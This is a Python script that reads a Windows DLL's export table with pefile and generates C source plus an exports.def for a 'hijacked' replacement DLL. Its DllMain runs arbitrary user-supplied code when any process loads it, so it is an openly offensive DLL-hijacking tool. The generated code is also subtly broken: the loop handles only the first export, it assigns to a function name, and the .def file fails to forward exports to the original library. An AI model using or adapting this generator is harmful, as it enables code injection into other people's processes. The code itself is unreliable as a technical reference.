import os
import pefile

def generate_hijacked_dll(original_dll_path, output_folder, hijacked_dll_name, hijack_code):
    # Load the original DLL using pefile
    pe = pefile.PE(original_dll_path)

    # Get the export symbols from the original DLL
    export_symbols = pe.DIRECTORY_ENTRY_EXPORT.symbols

    # Create the output folder if it doesn't exist
    if not os.path.exists(output_folder):
        os.makedirs(output_folder)

    # Generate the hijacked DLL code
    hijacked_dll_code = '''
#include "windows.h"

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        // Hijack the original DLL's exports
        for (int i = 0; i < %d; i++)
        {
            FARPROC original_proc = GetProcAddress(GetModuleHandle("%s"), "%s");
            if (original_proc!= NULL)
            {
                // Replace the original export with our own implementation
                *(FARPROC*)&%s = original_proc;
            }
        }
        // Provided hijack code
        %s
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
''' % (len(export_symbols), os.path.basename(original_dll_path), export_symbols[0].name, export_symbols[0].name, hijack_code)

    # Write the hijacked DLL code to a file
    with open(os.path.join(output_folder, hijacked_dll_name + '.c'), 'w') as f:
        f.write(hijacked_dll_code)

    export_def = 'LIBRARY %s\nEXPORTS\n' % hijacked_dll_name
    for symbol in export_symbols:
        export_def += '%s=%s @%d\n' % (symbol.name, symbol.name, symbol.ordinal)
    with open(os.path.join(output_folder, 'exports.def'), 'w') as f:
        f.write(export_def)

    print('DLL was generated successfully!')

def main():
    original_dll_path = input("Enter the path to the original DLL: ")
    output_folder = input("Enter the output folder: ")
    hijacked_dll_name = input("Enter the name of the hijacked DLL: ")
    hijack_code = input("Enter the hijack code (in C): ")

    generate_hijacked_dll(original_dll_path, output_folder, hijacked_dll_name, hijack_code)

if __name__ == "__main__":
    main()